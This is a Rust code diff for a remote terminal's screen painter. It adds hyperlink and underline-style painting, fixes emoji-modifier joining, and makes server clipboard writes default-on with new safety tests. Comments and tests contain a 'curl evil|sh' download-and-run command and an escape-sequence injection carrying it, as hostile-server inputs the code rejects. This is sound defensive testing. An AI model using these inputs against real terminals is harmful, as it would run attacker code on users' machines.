@@ -7,8 +7,10 @@ use std::io;
 
 use super::backend::{CellStyle, KohBackend};
 use crate::predict::Overlay;
-use crate::terminal::{Grid, Size, MAXIMUM_CLIPBOARD_SIZE};
-use fux_vt::{Blink, CellRef, Cells, Color, MouseProtocolEncoding, MouseProtocolMode};
+use crate::terminal::{Grid, Link, Size, MAXIMUM_CLIPBOARD_SIZE};
+use fux_vt::{
+    Blink, CellRef, Cells, Color, MouseProtocolEncoding, MouseProtocolMode, UnderlineStyle,
+};
 use unicode_width::UnicodeWidthStr as _;
 
 /// What the terminal was last painted with, so the next frame paints only what changed.
@@ -26,6 +28,10 @@ use unicode_width::UnicodeWidthStr as _;
 #[derive(Default)]
 pub(super) struct Painter {
     last: Option<Painted>,
+    /// Whether the terminal draws underline styles (`4:n`); if not, they are painted plain.
+    underline_styles: bool,
+    /// Whether hyperlinks are painted (OSC 8); if not, their text is painted plain.
+    hyperlinks: bool,
 }
 
 /// A frame as it was painted.
@@ -234,6 +240,7 @@ const BLANK: Paint<'static> = Paint::Glyph {
     glyph: " ",
     style: plain(Color::Default, Color::Default),
     span: 1,
+    link: None,
 };
 
 /// The marks of `marks` (in `(row, col)` order) on `row`.
@@ -248,11 +255,13 @@ fn marks_on<'m, 'a>(marks: &'m [Mark<&'a str>], row: u16) -> &'m [Mark<&'a str>]
 enum Paint<'a> {
     /// The right half of a wide glyph, which the glyph to its left covers.
     Covered,
-    /// `glyph` in `style`, over `span` cells of the grid: 2 for a wide cell, else 1.
+    /// `glyph` in `style`, over `span` cells of the grid: 2 for a wide cell, else 1, and the
+    /// hyperlink it has, if any.
     Glyph {
         glyph: &'a str,
         style: CellStyle,
         span: u16,
+        link: Option<&'a Link>,
     },
 }
 
@@ -265,7 +274,7 @@ const fn plain(fg: Color, bg: Color) -> CellStyle {
         bold: false,
         dim: false,
         italic: false,
-        underline: false,
+        underline: UnderlineStyle::None,
         inverse: false,
         hidden: false,
         strikeout: false,
@@ -296,6 +305,7 @@ fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Pai
             },
             style: plain(mark.fg, mark.bg),
             span: if covers_next { 2 } else { 1 },
+            link: None,
         };
     }
     let cell = grid.cell(row, col);
@@ -311,6 +321,7 @@ fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Pai
             glyph: " ",
             style,
             span: 1,
+            link: None,
         };
     }
     let Some(c) = cell else {
@@ -318,6 +329,7 @@ fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Pai
             glyph: " ",
             style: plain(Color::Default, Color::Default),
             span: 1,
+            link: None,
         };
     };
     if c.is_wide_continuation() {
@@ -333,14 +345,51 @@ fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Pai
             bold: c.bold(),
             dim: c.dim(),
             italic: c.italic(),
-            underline: c.underline(),
+            underline: c.underline_style(),
             inverse: c.inverse(),
             hidden: c.hidden(),
             strikeout: c.strikeout(),
             blink: c.blink(),
         },
         span: if c.is_wide() { 2 } else { 1 },
+        link: grid.link(row, col),
     }
+}
+
+/// Make `want` the hyperlink the glyphs printed next have, in place of `open`: close the one open,
+/// if any, and open `want`, if any.
+fn switch_link<'a>(
+    backend: &mut impl KohBackend,
+    open: &mut Option<&'a Link>,
+    want: Option<&'a Link>,
+) -> io::Result<()> {
+    if *open != want {
+        if open.is_some() {
+            backend.close_link()?;
+        }
+        if let Some(link) = want {
+            backend.open_link(link)?;
+        }
+        *open = want;
+    }
+    Ok(())
+}
+
+/// `link` if it is to be painted: links are `on`, and it is safe to write; else its text alone.
+fn paintable(link: Option<&Link>, on: bool) -> Option<&Link> {
+    link.filter(|link| on && link.safe())
+}
+
+/// Whether printing `glyph` right after `before` would continue `before`'s cluster: a skin-tone
+/// modifier or a combining mark the program placed in a cell of its own, which a terminal joins to
+/// the glyph printed just before it unless the cursor moved between them.
+fn joins(before: Option<&str>, glyph: &str) -> bool {
+    before.is_some_and(|before| {
+        glyph
+            .chars()
+            .next()
+            .is_some_and(|c| fux_vt::continues_cluster(before, c))
+    })
 }
 
 /// Whether every glyph `grid` and `marks` draw on `row` fills exactly the cells the grid gives it:
@@ -369,6 +418,24 @@ fn regular(grid: &Grid, marks: &[Mark<&str>], row: u16) -> bool {
 
 impl Painter {
     /// Forget what was painted: the next frame is painted whole.
+    /// Paint underline styles (`4:n`) if `on`, plain underlines if not; what is painted already
+    /// is painted again.
+    pub(super) fn set_underline_styles(&mut self, on: bool) {
+        if self.underline_styles != on {
+            self.underline_styles = on;
+            self.invalidate();
+        }
+    }
+
+    /// Paint hyperlinks if `on`, their text alone if not; what is painted already is painted
+    /// again.
+    pub(super) fn set_hyperlinks(&mut self, on: bool) {
+        if self.hyperlinks != on {
+            self.hyperlinks = on;
+            self.invalidate();
+        }
+    }
+
     pub(super) fn invalidate(&mut self) {
         self.last = None;
     }
@@ -439,18 +506,32 @@ impl Painter {
         backend.begin_frame()?;
 
         let mut cur_style: Option<CellStyle> = None;
+        // The hyperlink the glyphs printed now have on the terminal, if any.
+        let mut open_link: Option<&Link> = None;
+        let links_on = self.hyperlinks;
         let mut irregular = false;
         if whole {
             for row in 0..rows {
                 irregular = irregular || !regular(screen, &marks, row);
                 backend.move_to(row, 0)?;
+                let mut printed: Option<&str> = None;
                 for col in 0..cols {
-                    if let Paint::Glyph { glyph, style, .. } = paint(screen, &marks, row, col) {
+                    if let Paint::Glyph {
+                        glyph, style, link, ..
+                    } = paint(screen, &marks, row, col)
+                    {
+                        // A cell of its own, though it would join the glyph before it.
+                        if joins(printed, glyph) {
+                            backend.move_to(row, col)?;
+                        }
+                        let style = style.drawn(self.underline_styles);
                         if cur_style != Some(style) {
                             backend.set_style(style)?;
                             cur_style = Some(style);
                         }
+                        switch_link(backend, &mut open_link, paintable(link, links_on))?;
                         backend.print(glyph)?;
+                        printed = Some(glyph);
                     }
                 }
             }
@@ -466,12 +547,20 @@ impl Painter {
             // Where the cursor is after the last glyph painted, if known: past the last column the
             // terminal may be about to wrap.
             let mut cursor: Option<(u16, u16)> = None;
+            // The glyph printed last, which the next one printed with no cursor move follows.
+            let mut printed: Option<&str> = None;
             for row in (0..rows).filter(|&row| changed(row)) {
                 let repaint_row = Some(row) == status_row;
                 let mut col = 0;
                 while col < cols {
                     let now = paint(screen, &marks, row, col);
-                    let Paint::Glyph { glyph, style, span } = now else {
+                    let Paint::Glyph {
+                        glyph,
+                        style,
+                        span,
+                        link,
+                    } = now
+                    else {
                         col = col.saturating_add(1);
                         continue;
                     };
@@ -487,14 +576,17 @@ impl Painter {
                                 paint(screen, &marks, row, next) != before(next)
                             }));
                     if differs {
-                        if cursor != Some((row, col)) {
+                        if cursor != Some((row, col)) || joins(printed, glyph) {
                             backend.move_to(row, col)?;
                         }
+                        let style = style.drawn(self.underline_styles);
                         if cur_style != Some(style) {
                             backend.set_style(style)?;
                             cur_style = Some(style);
                         }
+                        switch_link(backend, &mut open_link, paintable(link, links_on))?;
                         backend.print(glyph)?;
+                        printed = Some(glyph);
                         cursor = col
                             .checked_add(span)
                             .filter(|&next| next < cols)
@@ -505,6 +597,8 @@ impl Painter {
             }
         }
 
+        // No link is left open, for the status line or the user's shell to inherit.
+        switch_link(backend, &mut open_link, None)?;
         if cur_style.is_some() {
             backend.reset_sgr()?;
         }
@@ -662,8 +756,9 @@ impl InputModes {
 pub(super) struct OutOfBand {
     /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
     title_prefix: String,
-    /// Whether the server may set the clipboard (`--clipboard`). Off by default: a hostile server
-    /// could swap a copied command for `curl evil|sh`.
+    /// Whether the server may set the clipboard: on unless `--no-clipboard`. A hostile server can
+    /// then replace what the user copied (a command for `curl evil|sh`), so only base64 within
+    /// the cap is forwarded, and the clipboard is never read.
     clipboard_enabled: bool,
     /// Whether the program set a title: until then the user's is left alone, after it even a reset
     /// to empty is mirrored (mosh's `title_initialized`).
@@ -902,26 +997,26 @@ mod tests {
     }
 
     #[test]
-    fn out_of_band_clipboard_off_by_default_emits_nothing() {
-        // A default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
-        // terminal even though the clipboard changed (the user never opted in).
-        let mut oob = OutOfBand::default();
+    fn out_of_band_clipboard_off_emits_nothing() {
+        // With clipboard writes off (`--no-clipboard`), no OSC 52 reaches the terminal even though
+        // the clipboard changed.
+        let mut oob = OutOfBand::default().with_clipboard(false);
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
         assert!(
             !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
-            "no OSC-52 without explicit opt-in, got {:?}",
+            "no OSC-52 with clipboard writes off, got {:?}",
             String::from_utf8_lossy(&buf)
         );
     }
 
     #[test]
-    fn out_of_band_forwards_clipboard_when_opted_in() {
+    fn out_of_band_forwards_clipboard_when_on() {
         let mut oob = OutOfBand::default().with_clipboard(true);
         let scr = screen_of(b"");
         let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
         assert!(
             String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
-            "clipboard OSC 52 forwarded when opted in"
+            "clipboard OSC 52 forwarded when on"
         );
         // Same clipboard again → not re-emitted.
         let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
@@ -929,8 +1024,8 @@ mod tests {
     }
 
     #[test]
-    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
-        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
+    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
+        // Even with clipboard writes on, a non-base64 payload (e.g. raw shell injection) is dropped, not
         // written verbatim to the terminal.
         let mut oob = OutOfBand::default().with_clipboard(true);
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
@@ -939,6 +1034,18 @@ mod tests {
             "a non-base64 clipboard payload is rejected, got {:?}",
             String::from_utf8_lossy(&buf)
         );
+    }
+
+    #[test]
+    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
+        // A query (`OSC 52 ; c ; ?`) would ask the user's terminal for their clipboard; it is not
+        // base64, so it never reaches the terminal, and nothing is ever asked of it.
+        let mut oob = OutOfBand::default().with_clipboard(true);
+        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "?", 0));
+        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
+        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
+        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", &huge, 0));
+        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
     }
 
     #[test]
@@ -1213,6 +1320,156 @@ mod tests {
     }
 
     /// Paint `grid` with `overlay` through `painter` into `terminal`, 6×20.
+    #[test]
+    fn a_modifier_placed_in_a_cell_of_its_own_is_not_joined_to_the_glyph_before_it() {
+        // vim places 👍 and then 🏽 with a cursor move between them, so the screen holds two
+        // cells; printed one after the other they would be one cluster on the user's terminal.
+        let at = |bytes: &[u8]| {
+            crate::terminal::TerminalScreen::from_bytes(6, 20, bytes)
+                .screen()
+                .clone()
+        };
+        let two = at("\u{1f44d}\x1b[1;3H\u{1f3fd}".as_bytes());
+        let looks = |terminal: &fux_vt::Parser| {
+            [0, 2].map(|col| {
+                terminal
+                    .screen()
+                    .cell(0, col)
+                    .map(|c| c.contents().to_owned())
+            })
+        };
+        let expected = [Some("\u{1f44d}".to_owned()), Some("\u{1f3fd}".to_owned())];
+        // Painted whole.
+        let mut terminal = fux_vt::Parser::new(6, 20, 0).unwrap();
+        paint_into(
+            &mut Painter::default(),
+            &mut terminal,
+            &two,
+            &Overlay::empty(),
+        );
+        assert_eq!(looks(&terminal), expected);
+        // Painted as a change: the two cells after one another on a row painted before.
+        let mut painter = Painter::default();
+        let mut terminal = fux_vt::Parser::new(6, 20, 0).unwrap();
+        paint_into(&mut painter, &mut terminal, &at(b"ab"), &Overlay::empty());
+        paint_into(&mut painter, &mut terminal, &two, &Overlay::empty());
+        assert_eq!(looks(&terminal), expected);
+    }
+
+    #[test]
+    fn a_programs_colours_are_painted_without_changing_the_users_palette() {
+        let screen = crate::terminal::TerminalScreen::from_bytes(
+            6,
+            20,
+            b"\x1b]4;1;#ff0000\x07\x1b]11;#000080\x07\x1b[31mR",
+        );
+        let mut backend = CaptureBackend {
+            size: Size::new(6, 20),
+            ..CaptureBackend::default()
+        };
+        Painter::default()
+            .render(&mut backend, screen.screen(), &Overlay::empty(), None)
+            .unwrap();
+        let painted = String::from_utf8_lossy(&backend.bytes).into_owned();
+        for osc in ["\x1b]4", "\x1b]10", "\x1b]11", "\x1b]104", "\x1b]11"] {
+            assert!(!painted.contains(osc), "{osc:?} sent: {painted:?}");
+        }
+        let options = fux_vt::Options::new().with_palette(true);
+        let mut terminal = fux_vt::Parser::with_options(6, 20, 0, options).unwrap();
+        terminal.process(&backend.bytes).unwrap();
+        assert!(!terminal.screen().colors_changed(), "the user's palette");
+        let cell = terminal.screen().cell(0, 0).unwrap();
+        assert_eq!(
+            (cell.contents(), cell.fgcolor(), cell.bgcolor()),
+            ("R", Color::Rgb(0xff, 0, 0), Color::Rgb(0, 0, 0x80))
+        );
+    }
+
+    /// The bytes a painter (with links `on`) paints for `screen`, a 6×20 one.
+    fn painted_with_links(screen: &Grid, on: bool) -> Vec<u8> {
+        let mut painter = Painter::default();
+        painter.set_hyperlinks(on);
+        let mut backend = CaptureBackend {
+            size: Size::new(6, 20),
+            ..CaptureBackend::default()
+        };
+        painter
+            .render(&mut backend, screen, &Overlay::empty(), None)
+            .unwrap();
+        backend.bytes
+    }
+
+    #[test]
+    fn a_hyperlink_is_painted_as_one_and_closed_after() {
+        let screen = crate::terminal::TerminalScreen::from_bytes(
+            6,
+            20,
+            b"a\x1b]8;id=x;https://example.org/\x1b\\link\x1b]8;;\x1b\\b",
+        );
+        let bytes = painted_with_links(screen.screen(), true);
+        let painted = String::from_utf8_lossy(&bytes).into_owned();
+        assert!(
+            painted.contains("\x1b]8;id=x;https://example.org/\x1b\\link\x1b]8;;\x1b\\b"),
+            "{painted:?}"
+        );
+        let options = fux_vt::Options::new().with_hyperlinks(true);
+        let mut terminal = fux_vt::Parser::with_options(6, 20, 0, options).unwrap();
+        terminal.process(&bytes).unwrap();
+        let link = |col| {
+            terminal
+                .screen()
+                .link(0, col)
+                .map(|l| (l.uri().to_owned(), l.id().map(str::to_owned)))
+        };
+        assert_eq!(link(0), None);
+        for col in 1..5 {
+            assert_eq!(
+                link(col),
+                Some(("https://example.org/".to_owned(), Some("x".to_owned())))
+            );
+        }
+        assert_eq!(link(5), None);
+        assert!(terminal.screen().hyperlink().is_none(), "none left open");
+        // With links off (`--no-hyperlinks`), the text alone.
+        let off = painted_with_links(screen.screen(), false);
+        assert!(!String::from_utf8_lossy(&off).contains("\x1b]8"));
+    }
+
+    #[test]
+    fn a_servers_link_that_is_not_safe_to_write_is_painted_as_plain_text() {
+        use crate::terminal::{TerminalScreen, WireLink};
+        // A hostile server's link that would end the OSC 8 and set the clipboard, or carry a
+        // space, or an id with a separator: each painted as its text, with no escape sequence.
+        let text = TerminalScreen::from_bytes(6, 20, b"link");
+        for (uri, id) in [
+            ("x\x1b]52;c;Y3VybCBldmlsfHNo\x07", ""),
+            ("https://example.org/a b", ""),
+            ("https://example.org/", "a;b"),
+            ("", ""),
+        ] {
+            let mut diff = text.diff_from(&TerminalScreen::default());
+            for row in &mut diff.rows {
+                row.links = vec![WireLink {
+                    uri: uri.to_owned(),
+                    id: id.to_owned(),
+                }];
+                for run in &mut row.runs {
+                    run.cell.link = 1;
+                }
+            }
+            let mut screen = TerminalScreen::default();
+            screen.apply(&diff);
+            assert!(screen.screen().link(0, 0).is_some(), "the link arrived");
+            let painted =
+                String::from_utf8_lossy(&painted_with_links(screen.screen(), true)).into_owned();
+            assert!(painted.contains("link"), "{painted:?}");
+            assert!(
+                !painted.contains("\x1b]8") && !painted.contains("\x1b]52"),
+                "{uri:?} {id:?}: {painted:?}"
+            );
+        }
+    }
+
     fn paint_into(
         painter: &mut Painter,
         terminal: &mut fux_vt::Parser,
@@ -1351,6 +1608,7 @@ mod tests {
             bg: WireColor::Default,
             underline_color: WireColor::Default,
             style: WireStyle::default(),
+            link: 0,
         };
         let mut diff = blank.diff_from(&blank);
         diff.rows = vec![RowDiff {
@@ -1366,6 +1624,7 @@ mod tests {
                     cell: cell("世", CellKind::Wide),
                 },
             ],
+            links: Vec::new(),
         }];
         let mut malformed = blank.clone();
         malformed.apply(&diff);
